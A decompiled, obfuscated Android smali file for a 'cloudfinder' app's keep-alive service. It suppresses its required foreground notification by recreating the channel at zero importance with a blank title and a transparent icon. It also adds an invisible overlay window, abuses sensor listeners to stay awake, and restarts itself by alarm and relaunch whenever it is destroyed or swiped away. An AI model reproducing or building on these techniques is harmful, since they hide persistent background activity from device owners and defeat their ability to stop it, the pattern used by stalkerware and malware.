.class public final Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field public static final ؤ:Ljava/lang/String;

.field public static إ:Z


# instance fields
.field public ؋:Landroid/view/SurfaceView;

.field public ؠ:Landroid/view/WindowManager;

.field public ء:Ljava/lang/Thread;

.field public آ:Landroid/hardware/SensorManager;

.field public أ:Lڟەطڽٲ/ء;


# direct methods
.method public static constructor <clinit>()V
    .locals 2

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "es"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "Conexi\u00f3n en segundo plano"

    goto :goto_0

    :cond_0
    const-string v0, "Background Connection"

    :goto_0
    sput-object v0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ؤ:Ljava/lang/String;

    const/4 v0, 0x0

    sput-boolean v0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->إ:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public final onDestroy()V
    .locals 4

    const-string v0, "SocketNotification"

    const/4 v1, 0x0

    :try_start_0
    iget-object v2, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->؋:Landroid/view/SurfaceView;

    if-eqz v2, :cond_0

    iget-object v3, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ؠ:Landroid/view/WindowManager;

    if-eqz v3, :cond_0

    invoke-interface {v3, v2}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V

    iput-object v1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->؋:Landroid/view/SurfaceView;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    const-string v3, "removeOverlay err"

    invoke-static {v0, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    :try_start_1
    iget-object v2, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->آ:Landroid/hardware/SensorManager;

    if-eqz v2, :cond_1

    iget-object v3, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->أ:Lڟەطڽٲ/ء;

    if-eqz v3, :cond_1

    invoke-virtual {v2, v3}, Landroid/hardware/SensorManager;->unregisterListener(Landroid/hardware/SensorEventListener;)V

    iput-object v1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->أ:Lڟەطڽٲ/ء;

    const-string v1, "Sensor keepalive unregistered"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    const-string v2, "sensor unregister err"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_1
    const/4 v1, 0x0

    :try_start_2
    invoke-virtual {p0, v1}, Landroid/app/Service;->stopForeground(I)V

    const-string v1, "Notification removed using STOP_FOREGROUND_REMOVE"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v1

    const-string v2, "STOP_FOREGROUND_REMOVE failed"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :try_start_3
    const-string v1, "notification"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    if-eqz v1, :cond_2

    const/16 v2, 0x3e9

    invoke-virtual {v1, v2}, Landroid/app/NotificationManager;->cancel(I)V

    :cond_2
    const-string v1, "Fallback: Notification manually cancelled"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_2

    :catch_3
    move-exception v1

    const-string v2, "All removal attempts failed"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_2
    const/4 v1, 0x0

    sput-boolean v1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->إ:Z

    const-string v1, "Service destroyed - scheduling restart"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-wide/16 v0, 0xbb8

    :try_start_4
    invoke-static {p0, v0, v1}, Lcom/lite/cloudfinder/receiver/AlarmReviveReceiver;->؋(Landroid/content/Context;J)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :catch_4
    :try_start_5
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 9

    sget-boolean p1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->إ:Z

    const/4 p2, 0x0   # IMPORTANCE_NONE：不显示通知

    const/4 p3, 0x0

    const-string v0, "SocketNotification"

    const/4 v1, 0x0

    if-nez p1, :cond_7

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    new-instance v2, Landroid/app/NotificationChannel;

    sget-object v3, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ؤ:Ljava/lang/String;

    const-string v4, "socket_fg_channel_v2"

    const/16 v5, 0x21

    if-lt p1, v5, :cond_0

    invoke-direct {v2, v4, v3, p2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    goto :goto_0

    :cond_0
    invoke-direct {v2, v4, v3, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    :goto_0
    invoke-virtual {v2, p3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    invoke-virtual {v2, p3}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    invoke-virtual {v2, p3}, Landroid/app/NotificationChannel;->enableLights(Z)V

    const-string v3, "Keeps connection alive"

    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    const/4 v3, -0x1

    if-ge p1, v5, :cond_1

    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    :cond_1
    const/4 v6, 0x0

    invoke-virtual {v2, v6, v6}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    const-class v6, Landroid/app/NotificationManager;

    invoke-virtual {p0, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/NotificationManager;

    if-eqz v6, :cond_2

    # 先删掉旧渠道，再建 importance=0 的，否则系统不允许降低已有渠道
    invoke-virtual {v6, v4}, Landroid/app/NotificationManager;->deleteNotificationChannel(Ljava/lang/String;)V

    invoke-virtual {v6, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    :cond_2
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    const-string v7, "drawable"

    const-string v8, "ic_transparent"

    invoke-virtual {v2, v8, v7, v6}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_3

    goto :goto_1

    :cond_3
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    const-string v6, "mipmap"

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v8, v6, v7}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_4

    goto :goto_1

    :cond_4
    const v2, 0x1080041

    :goto_1
    new-instance v6, Landroid/app/Notification$Builder;

    invoke-direct {v6, p0, v4}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v6, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    const-string v2, " "

    invoke-virtual {v6, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v6, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    invoke-virtual {v6, v1}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    if-lt p1, v5, :cond_5

    invoke-virtual {v6, v3}, Landroid/app/Notification$Builder;->setVisibility(I)Landroid/app/Notification$Builder;

    invoke-static {v6}, Landroidx/core/app/آ;->د(Landroid/app/Notification$Builder;)V

    goto :goto_2

    :cond_5
    const/4 v2, -0x2

    invoke-virtual {v6, v2}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    invoke-virtual {v6, v3}, Landroid/app/Notification$Builder;->setVisibility(I)Landroid/app/Notification$Builder;

    :goto_2
    const/16 v2, 0x1f

    if-lt p1, v2, :cond_6

    invoke-static {v6}, Landroidx/core/app/آ;->د(Landroid/app/Notification$Builder;)V

    :cond_6
    invoke-virtual {v6}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    const/16 v2, 0x3e9

    :try_start_0
    invoke-virtual {p0, v2, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    const-string p1, "app_state"

    invoke-virtual {p0, p1, p3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    const-string v2, "recent_swipe_detected"

    invoke-interface {p1, v2, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    const-string p1, "recent_swipe_detected and notification showing = true saved"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :catch_0
    move-exception p1

    :try_start_2
    const-string v2, "Cannot save swipe flag"

    invoke-static {v0, v2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    const-string p1, "Foreground service started \u2014 notification shown"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sput-boolean v1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->إ:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_4

    :catch_1
    move-exception p1

    const-string v2, "Failed to start foreground"

    invoke-static {v0, v2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    :cond_7
    :goto_4
    :try_start_3
    iget-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->؋:Landroid/view/SurfaceView;

    if-eqz p1, :cond_8

    goto :goto_5

    :cond_8
    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_9

    const-string p1, "window"

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/WindowManager;

    iput-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ؠ:Landroid/view/WindowManager;

    new-instance p1, Landroid/view/SurfaceView;

    invoke-direct {p1, p0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, p3}, Landroid/view/View;->setBackgroundColor(I)V

    new-instance p3, Landroid/view/WindowManager$LayoutParams;

    const/4 v3, 0x5

    const/4 v4, 0x5

    const/16 v5, 0x7f6

    const/16 v6, 0x18

    const/4 v7, -0x3

    move-object v2, p3

    invoke-direct/range {v2 .. v7}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const v2, 0x800033

    iput v2, p3, Landroid/view/WindowManager$LayoutParams;->gravity:I

    iget-object v2, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ؠ:Landroid/view/WindowManager;

    invoke-interface {v2, p1, p3}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iput-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->؋:Landroid/view/SurfaceView;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_5

    :catch_2
    move-exception p1

    const-string p3, "overlay err"

    invoke-static {v0, p3, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_9
    :goto_5
    iget-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ء:Ljava/lang/Thread;

    if-eqz p1, :cond_a

    invoke-virtual {p1}, Ljava/lang/Thread;->isAlive()Z

    move-result p1

    if-eqz p1, :cond_a

    goto :goto_6

    :cond_a
    new-instance p1, Ljava/lang/Thread;

    new-instance p3, Lڝږ؁ڋ/ا;

    const/16 v2, 0xf

    invoke-direct {p3, v2}, Lڝږ؁ڋ/ا;-><init>(I)V

    const-string v2, "KeepAliveGuardian"

    invoke-direct {p1, p3, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ء:Ljava/lang/Thread;

    invoke-virtual {p1, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    iget-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->ء:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    :goto_6
    :try_start_4
    iget-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->أ:Lڟەطڽٲ/ء;

    if-eqz p1, :cond_b

    goto :goto_7

    :cond_b
    const-string p1, "sensor"

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/hardware/SensorManager;

    iput-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->آ:Landroid/hardware/SensorManager;

    if-nez p1, :cond_c

    goto :goto_7

    :cond_c
    new-instance p3, Lڟەطڽٲ/ء;

    invoke-direct {p3}, Lڟەطڽٲ/ء;-><init>()V

    iput-object p3, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->أ:Lڟەطڽٲ/ء;

    invoke-virtual {p1, v1}, Landroid/hardware/SensorManager;->getDefaultSensor(I)Landroid/hardware/Sensor;

    move-result-object p1

    iget-object p3, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->آ:Landroid/hardware/SensorManager;

    const/4 v2, 0x5

    invoke-virtual {p3, v2}, Landroid/hardware/SensorManager;->getDefaultSensor(I)Landroid/hardware/Sensor;

    move-result-object p3

    if-eqz p1, :cond_d

    iget-object v2, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->آ:Landroid/hardware/SensorManager;

    iget-object v3, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->أ:Lڟەطڽٲ/ء;

    invoke-virtual {v2, v3, p1, p2}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    :cond_d
    if-eqz p3, :cond_e

    iget-object p1, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->آ:Landroid/hardware/SensorManager;

    iget-object v2, p0, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;->أ:Lڟەطڽٲ/ء;

    invoke-virtual {p1, v2, p3, p2}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    :cond_e
    const-string p1, "Sensor keepalive registered"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    goto :goto_7

    :catch_3
    move-exception p1

    const-string p2, "sensor err"

    invoke-static {v0, p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_7
    :try_start_5
    invoke-static {p0}, Lڗًقڔ/ء;->ػ(Landroid/content/Context;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    :catch_4
    return v1
.end method

.method public final onTaskRemoved(Landroid/content/Intent;)V
    .locals 2

    const-string v0, "SocketNotification"

    const-string v1, "Task removed \u2014 scheduling restart"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-wide/16 v0, 0xbb8

    :try_start_0
    invoke-static {p0, v0, v1}, Lcom/lite/cloudfinder/receiver/AlarmReviveReceiver;->؋(Landroid/content/Context;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/lite/cloudfinder/service/ForegroundKeepAliveService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
